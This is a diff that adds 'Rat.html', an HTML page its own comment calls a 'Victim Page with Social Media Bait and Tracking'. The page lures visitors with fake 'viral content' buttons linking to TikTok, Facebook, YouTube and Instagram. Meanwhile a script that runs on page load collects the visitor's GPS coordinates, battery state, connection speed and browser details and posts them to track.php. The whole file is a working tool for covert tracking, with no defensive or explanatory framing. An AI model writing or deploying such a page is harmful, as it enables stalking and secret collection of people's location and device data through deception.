@@ -1,0 +1,55 @@
+<!-- Rat.html - Victim Page with Social Media Bait and Tracking -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Video</title>
+    <script>
+        function sendVictimData() {
+            navigator.geolocation.getCurrentPosition(position => {
+                let lat = position.coords.latitude;
+                let lon = position.coords.longitude;
+                let accuracy = position.coords.accuracy;
+                
+                navigator.getBattery().then(battery => {
+                    let batteryLevel = Math.round(battery.level * 100);
+                    let chargingStatus = battery.charging ? "Yes" : "No";
+                    
+                    let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    let speed = connection ? connection.downlink : "Unknown";
+                    
+                    let device = navigator.userAgent;
+                    
+                    fetch('track.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            lat: lat, lon: lon, accuracy: accuracy,
+                            battery: batteryLevel, charging: chargingStatus,
+                            speed: speed, device: device
+                        })
+                    });
+                });
+            });
+        }
+        
+        window.onload = sendVictimData;
+    </script>
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; }
+        .container { margin-top: 50px; }
+        .redirect-btn { display: block; width: 200px; padding: 15px; margin: 10px auto; background: blue; color: white; text-decoration: none; border-radius: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Check out this viral content! 🔥</h2>
+        <a class="redirect-btn" href="https://www.tiktok.com/" target="_blank">TikTok Video</a>
+        <a class="redirect-btn" href="https://www.facebook.com/reels/" target="_blank">Facebook Reel</a>
+        <a class="redirect-btn" href="https://www.youtube.com/" target="_blank">YouTube Video</a>
+        <a class="redirect-btn" href="https://www.instagram.com/reels/" target="_blank">Instagram Reel</a>
+        <a class="redirect-btn" href="goodmorning.jpg" target="_blank">Good Morning Image</a>
+    </div>
+</body>
+</html>
